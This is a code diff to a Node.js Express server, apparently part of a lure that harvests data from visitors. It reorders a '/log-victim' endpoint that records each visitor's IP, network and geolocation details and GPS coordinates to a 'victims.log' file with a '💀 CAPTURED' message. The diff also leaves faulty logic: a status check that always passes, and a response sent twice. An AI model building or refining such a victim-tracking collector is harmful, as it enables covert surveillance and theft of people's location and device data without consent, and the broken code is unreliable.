@@ -299,18 +299,8 @@ app.get('/view-image', (req, res) => {
 app.post('/log-victim', express.json(), (req, res) => {
     const payload = req.body;
     const ip = req.ip;
-	try {
-		 const data = { ...req.body, ip: req.ip, timestamp: new Date().toISOString() };
-		console.log('💀 CAPTURED:', data);  // Force visible log
-		fs.appendFileSync('victims.log', JSON.stringify(data) + '\n');
-		res.status(200).send('OK');
-	 } catch (err) {
-    if (!res.headersSent) {  // ← guard
-      res.status(500).send('Internal error');
-    }
-  }
-    // Enhanced profile with new fields
-    const fullProfile = {
+	
+	const fullProfile = {
         ip,
         timestamp: new Date().toISOString(),
         // === GEO & NETWORK ===
@@ -377,6 +367,18 @@ app.post('/log-victim', express.json(), (req, res) => {
         gps_coords: payload.location,
     };
 
+	try {
+		 const data = { ...req.body, ip: req.ip, timestamp: new Date().toISOString() };
+		console.log('💀 CAPTURED:', data);  // Force visible log
+		fs.appendFileSync('victims.log', JSON.stringify(data) + '\n');
+		res.status(200).send('OK');
+	 } catch (err) {
+    if (!res.headersSent) {  // ← guard
+      res.status(500).send('Internal error');
+    }
+  }
+    // Enhanced profile with new fields
+    
     logVictim(fullProfile);
 	if (res.status(400)) {
     return res.status(400).send('Bad request'); // ← return stops here
